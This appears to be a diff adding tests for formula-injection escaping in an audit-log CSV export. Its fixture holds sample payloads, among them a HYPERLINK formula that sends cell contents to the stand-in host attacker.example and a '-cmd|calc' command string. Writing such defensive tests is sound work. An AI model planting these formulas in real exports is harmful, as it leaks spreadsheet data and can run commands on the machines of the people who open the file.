@@ -76,6 +76,37 @@ describe('GET /audit/export', () => {
         expect(res.text).toContain('"line one\nline two"')
     })
 
+    it('neutralises spreadsheet formulas planted in attacker-controlled columns', async () => {
+        // user_agent and ip_address come straight off the request, so an API-key
+        // holder can plant a formula that runs when the ACCOUNT OWNER opens the
+        // export in Excel/Sheets. Prefixing with an apostrophe makes the cell
+        // literal text.
+        all.mockReturnValue([{
+            ...rows[0],
+            user_agent: '=HYPERLINK("https://attacker.example/?d="&A2,"Open report")',
+            ip_address: '+1234',
+            action: '-cmd|calc',
+            details: '@SUM(1+1)',
+        }])
+        const res = await request(makeApp()).get('/audit/export')
+        const dataRow = res.text.trim().split('\r\n').at(-1)
+
+        expect(dataRow).toContain(`"'=HYPERLINK(`)
+        expect(dataRow).toContain(`'+1234`)
+        expect(dataRow).toContain(`'-cmd|calc`)
+        expect(dataRow).toContain(`'@SUM(1+1)`)
+        // The apostrophe is a rendering guard, not corruption: no cell may be
+        // left starting with a bare formula lead character.
+        for (const cell of dataRow.split(',')) {
+            expect(cell.replace(/^"/, '')).not.toMatch(/^[=+\-@]/)
+        }
+    })
+
+    it('leaves ordinary values untouched by the formula guard', async () => {
+        const res = await request(makeApp()).get('/audit/export')
+        expect(res.text).not.toContain("'")
+    })
+
     it('renders empty cells for nulls rather than the string "null"', async () => {
         const res = await request(makeApp()).get('/audit/export')
         const lastRow = res.text.trim().split('\r\n').at(-1)
